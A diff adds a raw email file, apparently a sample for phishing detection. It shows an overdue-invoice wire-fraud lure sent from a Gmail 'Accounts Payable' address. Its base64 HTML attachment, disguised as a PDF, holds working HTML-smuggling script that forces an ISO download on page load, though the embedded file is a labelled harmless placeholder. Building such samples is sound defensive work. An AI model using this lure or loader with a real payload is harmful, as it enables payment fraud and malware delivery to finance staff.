@@ -1,0 +1,46 @@
+Received: from mail-sor-f41.google.com (mail-sor-f41.google.com [209.85.220.41]) by mx.contoso.com
+ with ESMTPS id 9f8e7d6c5b; Wed, 28 Oct 2026 09:30:41 +0200
+Authentication-Results: mx.contoso.com; dkim=pass header.d=gmail.com header.s=20230601; spf=pass
+ smtp.mailfrom=gmail.com; dmarc=pass (p=NONE sp=QUARANTINE dis=NONE) header.from=gmail.com
+Return-Path: <ap.northwind.billing@gmail.com>
+Received: by mail-sor-f41.google.com with SMTP id 2adb3069b0e04-5a1b2c3d4e; Wed, 28 Oct 2026
+ 00:30:40 -0700 (PDT)
+From: Accounts Payable <ap.northwind.billing@gmail.com>
+To: finance@contoso.com
+Subject: RE: Invoice INV-20931 overdue
+Date: Wed, 28 Oct 2026 09:30:39 +0200
+Message-ID: <CAH7x9Lq2w@mail.gmail.com>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="==dayag-03-0=="
+
+--==dayag-03-0==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+Hello,
+
+As discussed, please find attached the outstanding invoice INV-20931. The payment is overdue; pleas=
+e process the wire transfer today to avoid late fees.
+
+The invoice opens in your browser.
+
+Regards,
+Accounts Payable
+
+--==dayag-03-0==
+Content-Type: text/html
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="INV-20931.pdf.html"
+MIME-Version: 1.0
+
+PCFET0NUWVBFIGh0bWw+CjxodG1sPjxoZWFkPjx0aXRsZT5JbnZvaWNlIElOVi0yMDkzMTwvdGl0bGU+PC9oZWFkPgo8Ym9keT4K
+PHA+TG9hZGluZyB5b3VyIGRvY3VtZW50LCBwbGVhc2Ugd2FpdC4uLjwvcD4KPHNjcmlwdD4KICAvLyBDbGFzc2ljIEhUTUwgc211
+Z2dsaW5nOiBkZWNvZGUgZW1iZWRkZWQgZGF0YSwgYnVpbGQgYSBmaWxlLCBmb3JjZSBhIGRvd25sb2FkLgogIHZhciBkYXRhID0g
+IlJHRjVZV2NnYzJGdGNHeGxPaUJvWVhKdGJHVnpjeUJ3YkdGalpXaHZiR1JsY2l3Z2JtOTBJR0VnY0dGNWJHOWhaQzRLIjsKICB2
+YXIgYnl0ZXMgPSBVaW50OEFycmF5LmZyb20oYXRvYihkYXRhKSwgZnVuY3Rpb24gKGMpIHsgcmV0dXJuIGMuY2hhckNvZGVBdCgw
+KTsgfSk7CiAgdmFyIGJsb2IgPSBuZXcgQmxvYihbYnl0ZXNdLCB7IHR5cGU6ICJhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0iIH0p
+OwogIHZhciBhID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiYSIpOwogIGEuaHJlZiA9IFVSTC5jcmVhdGVPYmplY3RVUkwoYmxv
+Yik7CiAgYS5kb3dubG9hZCA9ICJJTlYtMjA5MzEuaXNvIjsKICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOwogIGEuY2xp
+Y2soKTsKPC9zY3JpcHQ+CjwvYm9keT48L2h0bWw+Cg==
+
+--==dayag-03-0==--
